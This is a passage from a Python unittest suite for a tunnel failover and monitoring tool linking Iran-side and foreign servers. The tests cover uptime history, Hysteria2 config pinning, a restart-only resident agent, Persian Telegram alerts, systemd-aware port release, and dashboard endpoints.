        self.assertNotIn(pid, [p["id"] for p in benchmark_scheduler.active_pairs_from_storage()])
        storage.update_pair_status(pid, "ACTIVE", "rathole-noise")

    def test_140_health_history_turns_verdicts_into_uptime(self):
        """Phase 6 Health Center: monitor verdicts persist as history, and
        uptime math counts only samples that judged the tunnel - one long
        outage is one outage, and a skipped pass is not a vote either way.
        """
        pid = storage.add_pair(name=f"hist_{int(time.time() * 1000)}",
                               iran_host="198.51.100.36", foreign_host="203.0.113.36",
                               frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        now = time.time()
        # Samples are recorded in order; the summary reads them oldest-first.
        for verdict in ("HEALTHY", "HEALTHY", "DOWN_PENDING", "DOWN_PENDING",
                        "HEALTHY", "SKIP_NOT_ACTIVE", "HEAL_CONFIRMED", "HEALTHY"):
            storage.record_health_sample(pid, verdict, protocol="rathole-noise",
                                         loss_pct=0.0, latency_ms=41.0)
        summary = storage.health_uptime_summary(pid, since_ts=now - 3600)
        self.assertEqual(summary["up"], 4)
        self.assertEqual(summary["down"], 3)
        self.assertEqual(summary["outages"], 2,
                         "two separate down spells, not three down samples")
        self.assertAlmostEqual(summary["uptime_pct"], round(100.0 * 4 / 7, 2))
        self.assertEqual(summary["samples"], 8)
        history = storage.get_health_history(pid, limit=3)
        self.assertEqual(len(history), 3)
        self.assertEqual(history[0]["verdict"], "HEALTHY")

        # The monitor itself writes a sample on a sampled pass.
        real_check = failover.TunnelHealthChecker.__dict__["check_health"]
        report = failover.TunnelHealthReport(
            status="HEALTHY", loss_pct=0.0, latency_ms=41.2, overhead_ratio=1.0,
            is_unit_active_iran=True, is_unit_active_foreign=True,
            is_socket_listening=True, details="stub", backend_state="answered",
            ttl_state="clean")
        failover.TunnelHealthChecker.check_health = staticmethod(
            lambda ir, fr, pair, active, base_rtt=0.0, dry_run=False: report)
        self.addCleanup(setattr, failover.TunnelHealthChecker, "check_health", real_check)

        def factory(spec, dry_run=None, host_role="unknown"):
            return mock_ssh.MockSSHClient(host_role=host_role)

        mon = failover_monitor.FailoverMonitor(
            policy=failover_monitor.MonitorPolicy(
                interval_seconds=1, down_streak=3, saturation_enabled=False),
            pair_source=lambda: [{"id": pid, "status": "ACTIVE",
                                  "active_tunnel": "rathole-noise", "mode": "manual",
                                  "frontend_port": 9443,
                                  "iran": {"host": "198.51.100.36", "port": 22},
                                  "foreign": {"host": "203.0.113.36", "port": 22}}],
            runner_factory=factory,
            host_guard=failover_monitor.NullHostGuard(), dry_run=True)
        out = mon.run_once(auto_heal=False)[0]
        self.assertEqual(out["action"], "HEALTHY")
        latest = storage.get_health_history(pid, limit=1)[0]
        self.assertEqual(latest["verdict"], "HEALTHY")
        self.assertEqual(latest["protocol"], "rathole-noise")
        self.assertAlmostEqual(latest["latency_ms"], 41.2)

    def test_141_phase6_fleet_surface_is_data_not_decoration(self):
        """Phase 6: the fleet overview, the wizard's Persian reasons, and
        the diagnostics report are computed from stored evidence and the
        product's own analysers - and the page actually contains the
        sections that render them.
        """
        import fleet

        pid = storage.add_pair(name=f"fleet_{int(time.time() * 1000)}",
                               iran_host="198.51.100.37", foreign_host="203.0.113.37",
                               frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        storage.update_pair_status(pid, "ACTIVE", "rathole-noise")
        storage.record_health_sample(pid, "HEALTHY", protocol="rathole-noise",
                                     loss_pct=0.0, latency_ms=41.0)
        storage.log_audit(pid, "FAILOVER", "SUCCESS", "test switchover")
        cards = {c["id"]: c for c in fleet.fleet_overview()}
        self.assertIn(pid, cards)
        card = cards[pid]
        self.assertEqual(card["last_verdict"], "HEALTHY")
        self.assertEqual(card["failovers"], 1)
        self.assertEqual(card["active_tunnel"], "rathole-noise")

        row = {"score": 55.0, "throughput_mbps": 28.2, "disqualified": 0,
               "breakdown": {"s_lat": 0.5, "s_jit": 0.9, "s_bulk": 0.6,
                             "s_stab": 1.0, "loss_penalty": 0.0}}
        reasons = fleet.persian_score_reasons(row, "balanced")
        self.assertTrue(any("تاخیر" in r for r in reasons),
                        f"a low latency component must be named: {reasons}")
        self.assertTrue(any("ظرفیت" in r for r in reasons))
        self.assertTrue(any("28.2" in r for r in reasons))
        dq_row = dict(row, disqualified=1)
        self.assertTrue(any("حساب نمی‌شود" in r
                            for r in fleet.persian_score_reasons(dq_row)))

        pair = {"id": pid, "frontend": 9443, "mode": "manual",
                "iran": {"host": "198.51.100.37", "port": 22},
                "foreign": {"host": "203.0.113.37", "port": 22}}
        rep = fleet.diagnose_pair(mock_ssh.MockSSHClient(host_role="iran"),
                                  mock_ssh.MockSSHClient(host_role="foreign"),
                                  pair, "rathole-noise")
        self.assertIn("health", rep)
        self.assertIn("preflight_findings", rep)
        self.assertIn("ttl", rep)
        self.assertIn("quarantine", rep)

        for marker in ('id="fleetSection"', 'id="healthSection"',
                       'id="wizardSection"', 'id="wizardProfile"',
                       'id="fleetCards"', 'id="healthList"',
                       'id="wizardResults"', '/api/diagnostics',
                       '/api/quick_repair', '/api/mode'):
            self.assertIn(marker, dashboard.PAGE,
                          f"Phase 6 surface missing from the page: {marker}")

    def test_142_hysteria2_graduation_shape_and_pin(self):
        """Hysteria2 graduation (2026-10-24): the generator must emit exactly
        the shape the live witness proved, and nothing weaker.

        Live witness over the GRE carrier: server on Foreign, client on
        Iran with tcpForwarding to Foreign's loopback, ECDSA cert with
        SANs, salamander always on, TLS pinned two ways. Every one of
        those is asserted here, so a future edit cannot silently downgrade
        the protocol to an insecure or unwitnessed shape.
        """
        import re
        plan = protocols.generate_deployment(
            "hysteria2", 7, "10.10.11.1", "10.10.11.2", 9443,
            backend_port=9450)
        self.assertEqual(plan["protocol"], "hysteria2")
        iran_text = "\n".join(plan["iran_files"].values())
        fr_text = "\n".join(plan["foreign_files"].values())

        # Client on Iran dials the Foreign carrier-inner address, pins the
        # cert two ways, and forwards the frontend to Foreign's loopback.
        self.assertIn("server: 10.10.11.2:2444", iran_text)
        self.assertIn("pinSHA256:", iran_text)
        pin = re.search(r"pinSHA256:\s*([0-9A-F:]+)", iran_text).group(1)
        self.assertEqual(len(pin.split(":")), 32)
        self.assertIn("ca: /etc/best-tunnel/hysteria2/", iran_text)
        self.assertIn("tcpForwarding:", iran_text)
        self.assertIn("remote: 127.0.0.1:9450", iran_text)
        # The backend target table must read the same delivery back.
        tgt = protocols.backend_target("hysteria2", plan)
        self.assertEqual(tgt["port"], 9450)
        self.assertEqual(tgt["lands_on"], "foreign")
        # Server on Foreign binds the carrier-inner address only, with
        # salamander and a cert/key pair - never a bare QUIC listener.
        self.assertIn("listen: 10.10.11.2:2444", fr_text)
        self.assertIn("type: salamander", fr_text)
        self.assertIn("BEGIN CERTIFICATE", fr_text)
        self.assertIn("BEGIN EC PRIVATE KEY", fr_text)
        # No insecure escape hatch anywhere in either side's configs.
        self.assertNotIn("insecure", iran_text + fr_text)
        # Units use the global -c flag before the subcommand (the first
        # live attempt failed on `hysteria server -c ...` ordering).
        self.assertIn("hysteria -c ", iran_text)
        self.assertIn("hysteria -c ", fr_text)
        self.assertIn(" client", iran_text)
        self.assertIn(" server", fr_text)

        # Binary: pinned release, raw (uncompressed) install path, and the
        # F7 fast-path pin all agree on the witnessed hash.
        self.assertEqual(binary_manager.required_binaries("hysteria2"),
                         ["hysteria"])
        self.assertEqual(
            binary_manager.get_pinned_checksum("hysteria"),
            "907ba8c9693edb104b20582681fb7dc15639d5b64a9cbb616a7b539190a86691")
        script = binary_manager.generate_secure_install_script("hysteria")
        self.assertIn("HyNetworks/hysteria/releases/download/app/v2.13.0/"
                      "hysteria-linux-amd64", script)
        self.assertNotIn("tar -xzf", script)

        # Default backend (no declaration) still delivers to the frontend.
        plain = protocols.generate_deployment(
            "hysteria2", 7, "10.10.11.1", "10.10.11.2", 9443)
        self.assertIn("remote: 127.0.0.1:9443",
                      "\n".join(plain["iran_files"].values()))

    def test_143_resident_agent_authority_is_narrow_by_construction(self):
        """Phase 4 (2026-10-24): the Rust resident agent may restart ONLY
        the units its config names, and only with systemctl restart.
        These are static pins on the shipped source, so a future edit
        cannot quietly widen the agent into something that touches
        other services, switches protocols, or self-updates - the live
        acceptance on the test pair proved the behaviour, this test
        pins the shape that produced it."""
        agent_dir = os.path.join(os.path.dirname(__file__), "..", "agent")
        main_rs = open(os.path.join(agent_dir, "src", "main.rs")).read()
        cargo = open(os.path.join(agent_dir, "Cargo.toml")).read()
        installer = open(os.path.join(agent_dir, "install_agent.sh")).read()
        unit = open(os.path.join(agent_dir,
                                  "best-tunnel-agent.service")).read()
        example = open(os.path.join(agent_dir, "agent.toml.example")).read()
        # 1. Zero external crates: the agent builds with rustc alone, so
        # no registry download is ever needed on a filtered route.
        self.assertNotIn("crates.io", cargo)
        deps = cargo.split("[dependencies]", 1)[1]
        self.assertNotRegex(deps, r"^\s*[a-z0-9_-]+\s*=",
                            "agent must stay dependency-free")
        # 2. The only mutating systemctl verb in the binary is restart,
        # and it is gated on the owned-unit check.
        self.assertIn("fn is_owned", main_rs)
        self.assertIn('Command::new("systemctl")', main_rs)
        for verb in ('"stop"', '"start"', '"enable"', '"disable"',
                     '"kill"', '"mask"'):
            self.assertNotIn(verb, main_rs,
                             f"agent source must not contain systemctl {verb}")
        # The no-protocol-switch policy (D2) is stated in the source
        # itself, so it cannot drift away unnoticed.
        self.assertIn("never switches protocols", main_rs)
        # 3. Install refuses a binary whose hash does not match the pin.
        self.assertIn("sha256sum", installer)
        self.assertIn("mismatch", installer)
        # 4. The shipped unit runs the agent and nothing else, and the
        # example config documents the narrow authority.
        self.assertIn("/usr/local/bin/best-tunnel-agent", unit)
        self.assertIn("Restart=always", unit)
        self.assertIn("units = [", example)

    def test_144_telegram_alerts_fire_on_transitions_only(self):
        """Phase 5 (2026-10-24): Telegram alerts are transition-gated.
        The acceptance forbids alerts for ordinary/noise events, so
        this test pins the exact set: confirmed-down/heal/switch/
        degraded transitions alert, recovery alerts only close an
        incident the operator was told about, and unconfirmed, app-side
        and no-sample verdicts stay silent. The token never appears in
        a message or a redacted error."""
        import alerter as alerter_mod
        import failover_monitor as fm

        sent = []

        def recorder(text):
            sent.append(text)
            return True

        mon = fm.FailoverMonitor(host_guard=fm.NullHostGuard(), dry_run=True,
                                 alerter_obj=alerter_mod.TelegramAlerter(
                                     "SECRET-TOKEN-123", "999", sender=recorder))
        note = lambda pid, verdict, proto="rathole-noise": mon._note(  # noqa: E731
            pid, verdict, "detail", protocol=proto)
        note(1, "OBSERVE_DOWN")
        self.assertEqual(len(sent), 1)
        self.assertIn("1", sent[0])
        self.assertIn("rathole-noise", sent[0])
        self.assertNotIn("SECRET-TOKEN-123", sent[0])
        note(1, "OBSERVE_DOWN")
        self.assertEqual(len(sent), 1, "a repeated verdict must not re-alert")
        note(1, "LOCK_BUSY")
        self.assertEqual(len(sent), 1, "a no-sample pass must not alert")
        note(1, "HEALTHY")
        self.assertEqual(len(sent), 2, "a lock-held pass must not swallow "
                                       "the recovery message")
        self.assertIn("برگشت", sent[1])
        note(2, "DOWN_PENDING")
        note(2, "NO_BACKEND")
        note(2, "AMBIGUOUS_DOWN")
        self.assertEqual(len(sent), 2, "unconfirmed and app-side verdicts "
                                       "must stay silent")
        note(2, "HEALTHY")
        self.assertEqual(len(sent), 2, "a blip that never alerted earns "
                                       "no recovery message")
        note(3, "DEGRADED")
        self.assertEqual(len(sent), 3)
        note(3, "FAILOVER_EXECUTED")
        self.assertEqual(len(sent), 4)
        note(3, "HEALTHY")
        self.assertEqual(len(sent), 5, "a failover incident closes with "
                                       "a recovery message")
        # Token hygiene: a sender that explodes with the token in its
        # message must still leave no token in the recorded error.
        def exploding(text):
            raise RuntimeError("boom SECRET-TOKEN-123")
        bad = alerter_mod.TelegramAlerter("SECRET-TOKEN-123", "999",
                                          sender=exploding)
        self.assertFalse(bad.send("hello"))
        self.assertNotIn("SECRET-TOKEN-123", bad.last_error)
        # Daily summary: text shape, and the once-per-day gate.
        import datetime
        import tempfile
        text = alerter_mod.build_daily_summary(
            [{"pair_id": 1, "protocol": "rathole-noise", "uptime_pct": 99.4,
              "outages_24h": 1, "failovers": 1},
             {"pair_id": 2, "protocol": "gre", "uptime_pct": None,
              "outages_24h": 0, "failovers": 0}])
        self.assertIn("99%", text)
        self.assertIn("—", text)
        with tempfile.TemporaryDirectory() as tmp:
            mon.daily_summary_file = os.path.join(tmp, "sent.txt")
            mon.pair_source = lambda: [{"id": 1, "active_tunnel": "rathole-noise"}]
            day = datetime.date(2026, 10, 24)
            self.assertTrue(mon._maybe_daily_summary(today=day))
            self.assertEqual(len(sent), 6)
            self.assertFalse(mon._maybe_daily_summary(today=day),
                             "the same date must not send twice")
            self.assertTrue(mon._maybe_daily_summary(
                today=datetime.date(2026, 10, 25)))

    def test_148_alert_text_is_persian_listed_and_names_both_servers(self):
        """Phase 5 format (2026-10-24, operator feedback): an alert must
        read as a tidy Persian list - one fact per emoji-labelled line -
        with both servers' addresses on their own lines, so a later
        tunnel is never mistaken for this one. The engine's English
        reason stays verbatim but isolated on its own labelled line,
        never mixed into a Persian sentence. Hosts a caller does not
        have are omitted, never guessed."""
        import alerter as alerter_mod
        import failover_monitor as fm

        text = alerter_mod.alert_for_transition(
            "", "DEGRADED", 1, "rathole-noise",
            detail="Performance degradation (loss=0.0%, lat=261.8ms)",
            iran_host="192.0.2.10", foreign_host="203.0.113.20")
        lines = text.split("\n")
        self.assertEqual(lines[0], "📉 هشدار تانل")
        self.assertIn("📌 جفت: #1", lines)
        self.assertIn("🔌 پروتکل: rathole-noise", lines)
        self.assertIn("🖥️ سرور ایران: 192.0.2.10", lines)
        self.assertIn("🌍 سرور خارج: 203.0.113.20", lines)
        self.assertIn("📋 وضعیت: کیفیت پایین‌تر از حد مجاز", lines)
        self.assertIn("📝 دلیل: Performance degradation (loss=0.0%, lat=261.8ms)",
                      lines)
        # No line mixes a Persian label with an English sentence: every
        # line is either a Persian-labelled fact or the detail's own line.
        for line in lines:
            if line.startswith("📝"):
                self.assertTrue(line.startswith("📝 دلیل: "))
        bare = alerter_mod.alert_for_transition(
            "", "OBSERVE_DOWN", 2, "backhaul-wss")
        self.assertNotIn("سرور ایران", bare)
        self.assertNotIn("سرور خارج", bare)
        rec = alerter_mod.alert_for_transition(
            "FAILOVER_EXECUTED", "HEALTHY", 1, "rathole-noise",
            iran_host="192.0.2.10", foreign_host="203.0.113.20")
        self.assertIn("✅ هشدار تانل", rec)
        self.assertIn("برگشت به حالت سالم", rec)
        self.assertIn("🖥️ سرور ایران: 192.0.2.10", rec)
        summary = alerter_mod.build_daily_summary(
            [{"pair_id": 1, "protocol": "rathole-noise", "uptime_pct": 99.4,
              "outages_24h": 1, "failovers": 1,
              "iran_host": "192.0.2.10", "foreign_host": "203.0.113.20"}])
        self.assertIn("🖥️ سرور ایران: 192.0.2.10", summary)
        self.assertIn("🌍 سرور خارج: 203.0.113.20", summary)
        self.assertIn("99%", summary)
        # Monitor threading: hosts from the pair dict reach the text.
        sent = []
        mon = fm.FailoverMonitor(host_guard=fm.NullHostGuard(), dry_run=True,
                                 alerter_obj=alerter_mod.TelegramAlerter(
                                     "TOK", "999",
                                     sender=lambda t: sent.append(t) or True))
        mon._note(7, "OBSERVE_DOWN", "detail", protocol="backhaul-wss",
                  iran_host="192.0.2.10", foreign_host="203.0.113.20")
        self.assertEqual(len(sent), 1)
        self.assertIn("🖥️ سرور ایران: 192.0.2.10", sent[0])
        self.assertIn("🌍 سرور خارج: 203.0.113.20", sent[0])

    def test_149_guard_verifies_a_serving_degraded_successor_not_only_healthy(self):
        """F10 (2026-10-24, live): the atomic guard's successor check
        demanded HEALTHY, but a pair whose steady state is DEGRADED -
        the full-stack L7 cost through the peer's application - can
        never produce a HEALTHY successor. The observed heal deployed
        backhaul-wss in 29 s and then rolled it back even though it
        served. The guard must verify serving, not pristine quality:
        HEALTHY or DEGRADED commits, DOWN or TRANSPORT-ONLY rolls
        back."""
        import failover as failover_mod

        class FakeRunner:
            def run(self, cmd, check=True, best_effort=False, timeout=30,
                    retryable=False):
                if "nohup" in cmd:
                    return 0, "ARMED", ""
                if "touch" in cmd:
                    return 0, "COMMITTED", ""
                return 0, "", ""

        def report(status):
            return failover_mod.TunnelHealthReport(
                status=status, loss_pct=0.0 if status != "DOWN" else 100.0,
                latency_ms=250.0, overhead_ratio=5.0,
                is_unit_active_iran=True, is_unit_active_foreign=True,
                is_socket_listening=True, details="test",
                backend_state="answered", ttl_state="")

        pair = {"id": 5, "status": "ACTIVE", "active_tunnel": "rathole-noise",
                "frontend": 443, "frontend_port": 443, "base_rtt_ms": 41.0,
                "iran": {"host": "198.51.100.10", "port": 22,
                         "dial_host": "192.0.2.10"},
                "foreign": {"host": "203.0.113.20", "port": 22,
                            "dial_host": "192.0.2.20"}}
        # Capture the __dict__ entries, not attribute access: attribute access
        # unwraps a staticmethod into a plain function, and restoring that
        # unwrapped function makes later INSTANCE calls (the dashboard route
        # calls checker.check_health) shift every argument by one - the
        # runner lands in the pair slot. The other check_health patches in
        # this suite capture __dict__ for exactly this reason.
        orig_check = failover_mod.TunnelHealthChecker.__dict__["check_health"]
        orig_select = failover_mod.FailoverCandidateSelector.__dict__[
            "select_best_candidate"]

        class StubManager(failover_mod.FailoverManager):
            def execute_failover(self, pair, current, target, reason="",
                                 dry_run=False, ir_runner=None, fr_runner=None,
                                 quarantine=True):
                return {"success": True, "new_protocol": target}

        try:
            failover_mod.FailoverCandidateSelector.select_best_candidate = (
                staticmethod(lambda pair_id, current, pair=None: "backhaul-wss"))
            mgr = StubManager()
            failover_mod.TunnelHealthChecker.check_health = staticmethod(
                lambda *a, **k: report("DEGRADED"))
            res = mgr.evaluate_and_heal(pair, dry_run=False,
                                        ir_runner=FakeRunner(),
                                        fr_runner=FakeRunner(),
                                        health=report("DOWN"))
            self.assertEqual(res["action"], "FAILOVER_EXECUTED",
                             "a DEGRADED successor serves and must commit")
            failover_mod.TunnelHealthChecker.check_health = staticmethod(
                lambda *a, **k: report("DOWN"))
            res = mgr.evaluate_and_heal(pair, dry_run=False,
                                        ir_runner=FakeRunner(),
                                        fr_runner=FakeRunner(),
                                        health=report("DOWN"))
            self.assertEqual(res["action"], "FAILOVER_ATTEMPTED",
                             "a DOWN successor must still roll back")
        finally:
            failover_mod.TunnelHealthChecker.check_health = orig_check
            failover_mod.FailoverCandidateSelector.select_best_candidate = orig_select

    def test_150_port_release_stops_the_owning_unit_not_the_pid(self):
        """F11 (2026-10-24, live): release_port_safely stopped by process
        name (`systemctl stop backhaul` for a unit named
        best-tunnel-prod-p1-backhaul-server, which does not exist) and
        then killed the PID, so systemd resurrected the incumbent onto
        443 five seconds later while the new rathole unit spun on
        EADDRINUSE - and the deploy still reported success through the
        resurrected incumbent. A unit-owned listener must be stopped by
        unit name, with no kill at all; the kill fallback is only for
        listeners no unit owns."""
        import engine as engine_mod

        class FakeRunner:
            def __init__(self, unit_line):
                self.unit_line = unit_line
                self.cmds = []
                self.stopped = False

            def run(self, cmd, check=True, best_effort=False, timeout=30,
                    retryable=False):
                self.cmds.append(cmd)
                if cmd.startswith("ps -o unit="):
                    return 0, self.unit_line, ""
                if cmd.startswith("ss -tlnp"):
                    if self.stopped:
                        return 0, "", ""
                    return 0, ('LISTEN 0 65536 *:443 *:* '
                               'users:(("backhaul",pid=233424,fd=7))'), ""
                if cmd.startswith("ss -tinp"):
                    return 0, "", ""
                if cmd.startswith("systemctl stop "):
                    # Only stopping the real unit frees the port; stopping
                    # a bare process name is a no-op against a unit, and a
                    # hand-started process is no unit at all.
                    if cmd.strip() == ("systemctl stop "
                                       "best-tunnel-prod-p1-backhaul-server.service"):
                        self.stopped = True
                    return 0, "", ""
                if cmd.startswith("kill -15 ") or cmd.startswith("fuser -k"):
                    # A hand-started process really dies when killed.
                    self.stopped = True
                return 0, "", ""

        port_info = {"port": 443, "is_listening": True,
                     "process_name": "backhaul", "pid": "233424",
                     "active_connections": 0}
        runner = FakeRunner("best-tunnel-prod-p1-backhaul-server.service\n")
        res = engine_mod.release_port_safely(runner, 443, port_info,
                                             dry_run=True)
        self.assertTrue(res["success"])
        self.assertEqual(res["previous_unit"],
                         "best-tunnel-prod-p1-backhaul-server.service")
        self.assertIn("systemctl stop best-tunnel-prod-p1-backhaul-server.service",
                      runner.cmds)
        self.assertNotIn("kill -15 233424", runner.cmds,
                         "killing a unit-owned process is the resurrection bug")
        self.assertFalse(any("fuser -k" in c for c in runner.cmds))

        # Rollback must restart the same unit, not the process name.
        runner.cmds.clear()
        engine_mod.rollback_port_release(runner, res)
        self.assertIn("systemctl start best-tunnel-prod-p1-backhaul-server.service",
                      runner.cmds)

        # A listener no unit owns (hand-started, session scope) keeps the
        # kill fallback: there is no Restart to resurrect it.
        runner2 = FakeRunner("session-3.scope\n")
        res2 = engine_mod.release_port_safely(runner2, 443, port_info,
                                              dry_run=True)
        self.assertEqual(res2["previous_unit"], "")
        self.assertIn("kill -15 233424", runner2.cmds)
        self.assertTrue(res2["success"])

    def test_145_dual_endpoint_panel_renders_both_sides_not_json(self):
        """Phase 6 remainder (2026-10-24): the diagnostics report must
        carry the full preflight structure (per-host facts and both
        path directions), and the page must render it as a two-sided
        comparison panel - the old raw-JSON dump told the operator
        nothing about which end was sick."""
        import fleet

        pid = storage.add_pair(name=f"dual_{int(time.time() * 1000)}",
                               iran_host="198.51.100.37", foreign_host="203.0.113.37",
                               frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        storage.update_pair_status(pid, "ACTIVE", "rathole-noise")
        pair = {"id": pid, "frontend": 9443, "mode": "manual",
                "iran": {"host": "198.51.100.37", "port": 22},
                "foreign": {"host": "203.0.113.37", "port": 22}}
        rep = fleet.diagnose_pair(mock_ssh.MockSSHClient(host_role="iran"),
                                  mock_ssh.MockSSHClient(host_role="foreign"),
                                  pair, "rathole-noise")
        self.assertIn("preflight", rep)
        self.assertIn("iran", rep["preflight"])
        self.assertIn("foreign", rep["preflight"])
        self.assertIn("path", rep["preflight"])
        self.assertIn("preflight_findings", rep,
                      "the flat findings list stays for compatibility")
        for marker in ("renderDiagPanel", "مقایسه دو سر", "diagSickSide",
                       "is_unit_active_iran", "is_unit_active_foreign",
                       "backend_state"):
            self.assertIn(marker, dashboard.PAGE,
                          f"dual-endpoint panel missing from page: {marker}")
        self.assertNotIn("box.textContent = data.ok ? JSON.stringify(data.report",
                         dashboard.PAGE,
                         "the raw-JSON diagnostics dump must be replaced by "
                         "the panel (kept only as a fallback for a report "
                         "without a health block)")

    def test_146_sse_live_feed_streams_transitions_only(self):
        """Phase 6 remainder (2026-10-24): live events stream over real
        SSE, not another poll. The bus replays missed events on
        reconnect, the monitor publishes sampled transitions only, and
        the endpoint serves frames with the right content type."""
        import eventbus as eb
        import failover_monitor as fm

        bus = eb.EventBus(max_events=3)
        ids = [bus.publish("verdict", 1, "OBSERVE_DOWN", "down"),
               bus.publish("verdict", 1, "HEALTHY", "back"),
               bus.publish("verdict", 2, "DEGRADED", "slow"),
               bus.publish("verdict", 2, "HEALTHY", "back")]
        self.assertEqual(bus.since(2)[0]["verdict"], "DEGRADED")
        self.assertEqual(len(bus.since(0)), 3, "the ring keeps only the "
                                              "newest 3 events")
        self.assertEqual(bus.wait_since(999, timeout=0.05), [])

        mon = fm.FailoverMonitor(host_guard=fm.NullHostGuard(), dry_run=True,
                                 event_bus=bus)
        mon._note(7, "OBSERVE_DOWN", "down", protocol="rathole-noise")
        mon._note(7, "OBSERVE_DOWN", "down", protocol="rathole-noise")
        mon._note(7, "LOCK_BUSY", "busy")
        mon._note(7, "ERROR", "boom")
        published = [e["verdict"] for e in bus.since(ids[-1])]
        self.assertEqual(published, ["OBSERVE_DOWN", "ERROR"],
                         "repeats and no-sample passes must not reach "
                         "the feed; a monitor error must")

        frames = []

        def emit(frame):
            frames.append(frame)
            # Three replayed frames, then one heartbeat after the short
            # test wait, then the client goes away.
            if len(frames) >= 4:
                raise BrokenPipeError("client went away")

        dashboard.stream_events(bus, emit, 0, heartbeat=0.05)
        self.assertTrue(frames[0].startswith(b"id: "),
                        "frames must carry an id for reconnect replay")
        self.assertIn(b"data: ", frames[0])
        self.assertIn(b"keep-alive", frames[-1],
                      "a quiet bus must still heartbeat so proxies do "
                      "not kill the stream")

        for marker in ("EventSource('/api/events')", 'id="liveEvents"',
                       "/api/events"):
            self.assertIn(marker, dashboard.PAGE,
                          f"SSE feed missing from page: {marker}")

        # End to end over a real socket: headers, replay, then close.
        import socket
        import threading
        from http.server import ThreadingHTTPServer
        server = ThreadingHTTPServer(("127.0.0.1", 0), dashboard.H)
        port = server.server_address[1]
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        try:
            dashboard.EVENT_BUS.publish("verdict", 9, "DEGRADED", "e2e")
            import urllib.request
            req = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/events")
            with urllib.request.urlopen(req, timeout=5) as resp:
                self.assertIn("text/event-stream",
                              resp.headers.get("Content-Type", ""))
                buf = b""
                # Read one complete frame (terminated by a blank line),
                # not just the "data: " prefix of it.
                while b"\n\n" not in buf:
                    chunk = resp.read(1)
                    if not chunk:
                        break
                    buf += chunk
            self.assertIn(b"DEGRADED", buf)
        finally:
            server.shutdown()
            server.server_close()

    def test_147_history_chart_endpoint_serves_chronological_samples(self):
        """Phase 6 remainder (2026-10-24): the history chart reads
        chronological monitor samples (latency, loss, verdict) from a
        dedicated endpoint - newest-first storage rows reversed, capped
        - and the page renders them as a latency line with
        verdict-coloured points, including the switchover marker."""
        pid = storage.add_pair(name=f"hist_{int(time.time() * 1000)}",
                               iran_host="198.51.100.37", foreign_host="203.0.113.37",
                               frontend_port=9443)
        self.addCleanup(storage.delete_pair, pid)
        storage.record_health_sample(pid, "HEALTHY", protocol="rathole-noise",
                                     loss_pct=0.0, latency_ms=41.0)
        storage.record_health_sample(pid, "DEGRADED", protocol="rathole-noise",
                                     loss_pct=2.0, latency_ms=220.0)
        storage.record_health_sample(pid, "FAILOVER_EXECUTED",
                                     protocol="backhaul-wss",
                                     loss_pct=0.0, latency_ms=68.0)

        import json as json_mod
        import threading
        import urllib.request
        from http.server import ThreadingHTTPServer
        server = ThreadingHTTPServer(("127.0.0.1", 0), dashboard.H)
        port = server.server_address[1]
        old_hosts = dashboard.ALLOWED_HOSTS
        dashboard.ALLOWED_HOSTS = set(old_hosts) | {f"127.0.0.1:{port}"}
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        try:
            def post(payload):
                # The shared POST tail answers ok=False with HTTP 400,
                # so a negative case arrives as an exception, not a body.
                import urllib.error
                req = urllib.request.Request(
                    f"http://127.0.0.1:{port}/api/history",
                    data=json_mod.dumps(payload).encode("utf-8"),
                    headers={"Content-Type": "application/json",
                             "X-Best-Tunnel-CSRF": "1"})
                try:
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        return json_mod.loads(resp.read().decode("utf-8"))
                except urllib.error.HTTPError as exc:
                    return json_mod.loads(exc.read().decode("utf-8"))
            data = post({"id": pid, "limit": 500})
            self.assertTrue(data["ok"], data)
            verdicts = [s["verdict"] for s in data["samples"]]
            self.assertEqual(verdicts, ["HEALTHY", "DEGRADED",
                                        "FAILOVER_EXECUTED"],
                             "samples must arrive chronological, oldest first")
            self.assertEqual([s["lat"] for s in data["samples"]],
                             [41.0, 220.0, 68.0])
            self.assertEqual(data["samples"][1]["loss"], 2.0)
            bad = post({"id": 999999, "limit": 500})
            self.assertFalse(bad["ok"])
        finally:
            dashboard.ALLOWED_HOSTS = old_hosts
            server.shutdown()
            server.server_close()

        for marker in ("showHistoryChart", "chartCanvas-",
                       "FAILOVER_EXECUTED", "throughput در نمونه‌های مانیتور"):
            self.assertIn(marker, dashboard.PAGE,
                          f"history chart missing from page: {marker}")

    def test_25_binary_manager_checksum_verification(self):
        """Condition 5 & R-21 Acceptance Test: Cryptographic SHA-256 verification and secure installer."""
        chk = binary_manager.get_pinned_checksum("sing-box", "v1.10.1")
        self.assertEqual(len(chk), 64)

        script = binary_manager.generate_secure_install_script("sing-box", "v1.10.1")
        self.assertIn("sha256sum", script)
        self.assertIn("exit 1", script)
        self.assertIn(chk, script)

        mock_runner = mock_ssh.MockSSHClient(host_role="iran")
        ok, msg = binary_manager.verify_and_install_binary(mock_runner, "sing-box", "v1.10.1", dry_run=True)
        self.assertTrue(ok)
        self.assertIn("MOCK", msg)

        with tempfile.NamedTemporaryFile(delete=False) as tf:
            tf.write(b"best-tunnel-test-payload")
            tf_path = tf.name
        try:
            actual_sha = hashlib.sha256(b"best-tunnel-test-payload").hexdigest()
            self.assertTrue(binary_manager.verify_file_sha256(tf_path, actual_sha))
            self.assertFalse(binary_manager.verify_file_sha256(tf_path, "0" * 64))
        finally:
            if os.path.exists(tf_path):
                os.remove(tf_path)

    def test_26_singbox_deep_schema_validation_rejection(self):
        """Senior Auditor Finding 3-2 Acceptance Test: Deep validation strictly rejects malformed configurations."""
        # 1. Valid config passes
        plan = protocols.SingBoxAdapter.generate_vless_reality(
            pair_id=12, ir_ip="198.51.100.10", fr_ip="203.0.113.20", frontend=443, transport_port=2090
        )
        server_cfg = json.loads(list(plan["foreign_files"].values())[0])
        self.assertTrue(protocols.SingBoxAdapter.validate_config(server_cfg))

        # 2. Reject missing uuid
        bad_vless = json.loads(json.dumps(server_cfg))
        bad_vless["inbounds"][0]["users"][0]["uuid"] = ""
        self.assertFalse(protocols.SingBoxAdapter.validate_config(bad_vless))

        # 3. Reject missing reality keys
        bad_reality = json.loads(json.dumps(server_cfg))
        bad_reality["inbounds"][0]["tls"]["reality"]["private_key"] = ""
        self.assertFalse(protocols.SingBoxAdapter.validate_config(bad_reality))

        # 4. Reject invalid port range
